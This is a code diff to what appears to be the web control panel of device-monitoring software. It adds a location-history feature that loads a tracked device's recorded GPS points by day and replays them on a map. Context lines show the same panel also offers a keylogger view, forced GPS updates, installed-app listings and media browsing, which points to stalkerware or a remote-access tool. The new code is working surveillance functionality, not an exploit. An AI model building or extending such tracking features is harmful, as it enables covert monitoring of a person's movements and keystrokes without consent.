@@ -351,6 +351,39 @@ h1,h2,h3{ font-family:'Sora', Arial, sans-serif; font-weight:700; color:var(--in
 }
 @keyframes spin { to { transform: rotate(360deg); } }
 
+/* ==================== LOCATION HISTORY PLAYBACK ==================== */
+.history-controls {
+    display: none;
+    flex-direction: column; gap: 14px;
+    margin: 0 22px 22px 22px;
+    background: rgba(255,255,255,.03);
+    border: 1px solid var(--line);
+    border-radius: 14px; padding: 16px 18px;
+    animation: fadeSlideUp .35s ease both;
+}
+.history-controls.active { display: flex; }
+.history-row { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+.history-row label { color: var(--ink-dim); font-size: 10px; text-transform: uppercase; letter-spacing:.6px; font-weight:700; }
+.history-row select {
+    background: #0b1512; color: #fff; border: 1px solid var(--line);
+    border-radius: 10px; padding: 9px 13px; font-size: 12.5px; font-family: inherit;
+    outline: none; cursor: pointer; transition: border-color .2s; min-width: 150px;
+}
+.history-row select:hover, .history-row select:focus { border-color: var(--teal); box-shadow: 0 0 0 3px rgba(63,224,176,.14); }
+.history-play-btn {
+    background: var(--grad-2); color: #06140F; border: none; border-radius: 50%;
+    width: 38px; height: 38px; flex-shrink: 0; font-size: 14px; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 8px 20px var(--glow-soft); transition: all .2s ease;
+}
+.history-play-btn:hover { box-shadow: 0 10px 24px var(--glow); transform: translateY(-1px); }
+.history-play-btn:disabled { opacity: .5; cursor: not-allowed; transform: none; box-shadow: none; }
+.history-slider { flex: 1; min-width: 160px; accent-color: var(--teal); cursor: pointer; }
+.history-timestamp { font-size: 11.5px; color: var(--ink-soft); white-space: nowrap; min-width: 92px; text-align: right; }
+.history-meta { font-size: 11px; color: var(--ink-dim); }
+.history-empty { font-size: 12px; color: var(--ink-dim); padding: 4px 2px; }
+#historyToggleBtn.active-history { background: rgba(63,224,176,.16); box-shadow: none; color: var(--teal-2); }
+
 /* ==================== KEYLOGGER ==================== */
 .keylog-box { padding: 6px 22px 22px 22px; display: flex; flex-direction: column; gap: 9px; max-height: 70vh; overflow-y: auto; }
 
@@ -569,6 +602,7 @@ h1,h2,h3{ font-family:'Sora', Arial, sans-serif; font-weight:700; color:var(--in
                     <div class="panel-subtitle">Real-time GPS coordinates and live interactive map explorer.</div>
                 </div>
                 <button class="force-btn" id="forceGpsBtn" onclick="forceGpsUpdate()">➤ Force GPS Update</button>
+                <button class="force-btn" id="historyToggleBtn" onclick="toggleHistoryMode()">🕑 Location History</button>
             </div>
 
             <div class="gps-stats">
@@ -596,6 +630,20 @@ h1,h2,h3{ font-family:'Sora', Arial, sans-serif; font-weight:700; color:var(--in
                     <div class="spinner"></div>
                     <span id="mapOverlayText">Requesting GPS location...</span>
                 </div>
+            </div>
+
+            <div class="history-controls" id="historyControls">
+                <div class="history-row">
+                    <label>Day</label>
+                    <select id="historyDateSelect" onchange="loadHistoryForDate(this.value)"></select>
+                    <span class="history-meta" id="historyMeta"></span>
+                </div>
+                <div class="history-row" id="historyPlaybackRow" style="display:none;">
+                    <button class="history-play-btn" id="historyPlayBtn" onclick="toggleHistoryPlayback()">▶</button>
+                    <input type="range" class="history-slider" id="historySlider" min="0" max="0" value="0" oninput="renderHistoryAtIndex(parseInt(this.value))">
+                    <span class="history-timestamp" id="historyTimestamp">--:--:--</span>
+                </div>
+                <div class="history-empty" id="historyEmptyMsg" style="display:none;">No location points recorded for this day.</div>
             </div>
         </section>
 
@@ -1015,6 +1063,7 @@ async function loadDeviceInfo(showLoadingOverlay = false) {
 
 // ==================== UPDATE GPS DATA ====================
 function updateGPSData(data) {
+    if (historyMode) return; // don't let live polling fight with history playback
     const deviceId = getDeviceId();
     const lat = data.latitude ?? null;
     const lng = data.longitude ?? null;
@@ -1062,6 +1111,179 @@ function updateGPSData(data) {
     removeMarker();
     map.setView(DEFAULT_CENTER, DEFAULT_ZOOM);
     showOverlayText("Waiting for GPS location...");
+}
+
+// ==================== LOCATION HISTORY PLAYBACK ====================
+let historyMode = false;
+let historyPoints = [];
+let historyPolyline = null;
+let historyMarker = null;
+let historyTimer = null;
+let historyPlaying = false;
+
+const HISTORY_SPEED_MS = 350; // ms between points while playing
+
+function toggleHistoryMode() {
+    historyMode = !historyMode;
+    const toggleBtn = document.getElementById("historyToggleBtn");
+    const controls = document.getElementById("historyControls");
+    const overlay = document.getElementById("mapOverlay");
+
+    if (historyMode) {
+        toggleBtn.textContent = "📍 Back to Live";
+        toggleBtn.classList.add("active-history");
+        controls.classList.add("active");
+        if (overlay) overlay.style.display = "none";
+        loadHistoryDates();
+    } else {
+        toggleBtn.innerHTML = "🕑 Location History";
+        controls.classList.remove("active");
+        exitHistoryMode();
+    }
+}
+
+function exitHistoryMode() {
+    pauseHistoryPlayback();
+    clearHistoryTrack();
+    historyPoints = [];
+    // restore the live marker/location
+    loadDeviceInfo(false);
+}
+
+function clearHistoryTrack() {
+    if (historyPolyline) { map.removeLayer(historyPolyline); historyPolyline = null; }
+    if (historyMarker) { map.removeLayer(historyMarker); historyMarker = null; }
+}
+
+async function loadHistoryDates() {
+    const select = document.getElementById("historyDateSelect");
+    const meta = document.getElementById("historyMeta");
+    select.innerHTML = `<option>Loading…</option>`;
+    try {
+        const deviceId = getDeviceId();
+        const res = await fetch(`/api/location-history/dates?deviceId=${encodeURIComponent(deviceId)}`);
+        if (!res.ok) throw new Error("Failed to load history dates");
+        const data = await res.json();
+        const dates = data.dates || [];
+        if (dates.length === 0) {
+            select.innerHTML = `<option value="">No history yet</option>`;
+            meta.textContent = "";
+            document.getElementById("historyPlaybackRow").style.display = "none";
+            document.getElementById("historyEmptyMsg").style.display = "block";
+            return;
+        }
+        select.innerHTML = dates.map(d => `<option value="${d.date}">${d.date} (${d.points} point${d.points === 1 ? '' : 's'})</option>`).join('');
+        await loadHistoryForDate(dates[0].date);
+    } catch (e) {
+        console.error(e);
+        select.innerHTML = `<option value="">Failed to load</option>`;
+    }
+}
+
+async function loadHistoryForDate(date) {
+    pauseHistoryPlayback();
+    clearHistoryTrack();
+    historyPoints = [];
+    const meta = document.getElementById("historyMeta");
+    const emptyMsg = document.getElementById("historyEmptyMsg");
+    const playbackRow = document.getElementById("historyPlaybackRow");
+
+    if (!date) {
+        playbackRow.style.display = "none";
+        emptyMsg.style.display = "block";
+        return;
+    }
+
+    try {
+        const deviceId = getDeviceId();
+        const res = await fetch(`/api/location-history?deviceId=${encodeURIComponent(deviceId)}&date=${encodeURIComponent(date)}`);
+        if (!res.ok) throw new Error("Failed to load history points");
+        const data = await res.json();
+        historyPoints = data.points || [];
+
+        if (historyPoints.length === 0) {
+            playbackRow.style.display = "none";
+            emptyMsg.style.display = "block";
+            meta.textContent = "";
+            return;
+        }
+
+        emptyMsg.style.display = "none";
+        playbackRow.style.display = "flex";
+        meta.textContent = `${historyPoints.length} point${historyPoints.length === 1 ? '' : 's'} recorded`;
+
+        const latlngs = historyPoints.map(p => [p.latitude, p.longitude]);
+        historyPolyline = L.polyline(latlngs, { color: '#3FE0B0', weight: 3, opacity: 0.8 }).addTo(map);
+        map.fitBounds(historyPolyline.getBounds(), { padding: [30, 30] });
+
+        const slider = document.getElementById("historySlider");
+        slider.max = historyPoints.length - 1;
+        slider.value = 0;
+        renderHistoryAtIndex(0);
+    } catch (e) {
+        console.error(e);
+        emptyMsg.textContent = "Failed to load location history.";
+        emptyMsg.style.display = "block";
+        playbackRow.style.display = "none";
+    }
+}
+
+function renderHistoryAtIndex(index) {
+    if (!historyPoints.length) return;
+    index = Math.max(0, Math.min(index, historyPoints.length - 1));
+    const point = historyPoints[index];
+    const lat = point.latitude, lng = point.longitude;
+    const time = new Date(point.recorded_at);
+
+    document.getElementById("historySlider").value = index;
+    document.getElementById("historyTimestamp").textContent = time.toLocaleTimeString();
+
+    const icon = L.divIcon({
+        className: 'custom-marker',
+        html: '<div style="background:#3FE0B0; width:14px; height:14px; border-radius:50%; border:2px solid #fff; box-shadow:0 0 10px #3FE0B0;"></div>',
+        iconSize: [18, 18],
+        iconAnchor: [9, 9]
+    });
+
+    if (!historyMarker) {
+        historyMarker = L.marker([lat, lng], { icon }).addTo(map);
+    } else {
+        historyMarker.setLatLng([lat, lng]);
+    }
+    historyMarker.bindPopup(
+        `<b>${time.toLocaleString()}</b><br>Latitude: ${lat.toFixed(6)}<br>Longitude: ${lng.toFixed(6)}${point.accuracy ? `<br>Accuracy: ${point.accuracy} m` : ''}`
+    );
+    map.panTo([lat, lng]);
+}
+
+function toggleHistoryPlayback() {
+    if (historyPlaying) pauseHistoryPlayback();
+    else playHistoryPlayback();
+}
+
+function playHistoryPlayback() {
+    if (!historyPoints.length) return;
+    let index = parseInt(document.getElementById("historySlider").value, 10) || 0;
+    if (index >= historyPoints.length - 1) index = 0; // restart from the beginning if at the end
+
+    historyPlaying = true;
+    document.getElementById("historyPlayBtn").textContent = "⏸";
+
+    historyTimer = setInterval(() => {
+        if (index >= historyPoints.length - 1) {
+            pauseHistoryPlayback();
+            return;
+        }
+        index++;
+        renderHistoryAtIndex(index);
+    }, HISTORY_SPEED_MS);
+}
+
+function pauseHistoryPlayback() {
+    historyPlaying = false;
+    if (historyTimer) { clearInterval(historyTimer); historyTimer = null; }
+    const btn = document.getElementById("historyPlayBtn");
+    if (btn) btn.textContent = "▶";
 }
 
 // ==================== RENDER INSTALLED APPS ====================
@@ -1181,6 +1403,7 @@ function nextMedia() {
 
 // ==================== TABS ====================
 function setActiveTab(btn) {
+    pauseHistoryPlayback();
     document.querySelectorAll(".control-btn").forEach(b => b.classList.remove("active"));
     btn.classList.add("active");
 }
